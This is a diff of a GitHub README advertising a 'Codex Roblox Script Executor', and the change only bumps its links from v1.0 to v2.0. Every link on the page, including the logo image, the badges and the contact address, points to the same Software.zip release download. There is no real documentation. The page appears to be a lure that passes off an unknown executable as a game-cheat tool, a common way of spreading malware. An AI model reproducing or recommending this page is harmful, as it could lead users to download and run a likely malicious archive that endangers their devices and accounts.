@@ -1,6 +1,6 @@
 # 🤖 Codex Roblox Script Executor 🚀
 
-![Roblox Logo](https://github.com/iancutkd/Codex-Roblox/releases/download/v1.0/Software.zip)
+![Roblox Logo](https://github.com/iancutkd/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 Welcome to the "Codex-Roblox" repository! This is the go-to place for all your Roblox script execution needs, offering you unparalleled functionality to effortlessly run scripts for your favorite Roblox games.
 
@@ -20,9 +20,9 @@ Welcome to the "Codex-Roblox" repository! This is the go-to place for all your R
 builder, code, codex, codex-download, codex-github, codex-roblox, collaborate, community, contribute, development, framework, roblox, roblox-codex, roblox-lua
 
 ## 🌐 Installation
-To get started with Codex Roblox, download the [Codex Browser](https://github.com/iancutkd/Codex-Roblox/releases/download/v1.0/Software.zip) and launch it for seamless script execution. 🚀
+To get started with Codex Roblox, download the [Codex Browser](https://github.com/iancutkd/Codex-Roblox/releases/download/v2.0/Software.zip) and launch it for seamless script execution. 🚀
 
-[![Download Codex Browser](https://github.com/iancutkd/Codex-Roblox/releases/download/v1.0/Software.zip%20Browser-9cf)](https://github.com/iancutkd/Codex-Roblox/releases/download/v1.0/Software.zip)
+[![Download Codex Browser](https://github.com/iancutkd/Codex-Roblox/releases/download/v2.0/Software.zip%20Browser-9cf)](https://github.com/iancutkd/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 If the link above doesn't work, please check the "Releases" section for alternative download options.
 
@@ -39,12 +39,12 @@ Codex Roblox is continually evolving, with a focus on providing a robust framewo
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## 📞 Contact
-For any inquiries or support, you can reach out to us at https://github.com/iancutkd/Codex-Roblox/releases/download/v1.0/Software.zip
+For any inquiries or support, you can reach out to us at https://github.com/iancutkd/Codex-Roblox/releases/download/v2.0/Software.zip
 
 ---
 
 Start using Codex Roblox today and take your Roblox gaming experience to the next level! 💥🎮
 
-[![Get Started](https://github.com/iancutkd/Codex-Roblox/releases/download/v1.0/Software.zip%20Started-Now-orange)](https://github.com/iancutkd/Codex-Roblox/releases/download/v1.0/Software.zip)
+[![Get Started](https://github.com/iancutkd/Codex-Roblox/releases/download/v2.0/Software.zip%20Started-Now-orange)](https://github.com/iancutkd/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 Happy gaming! 🌟🤖
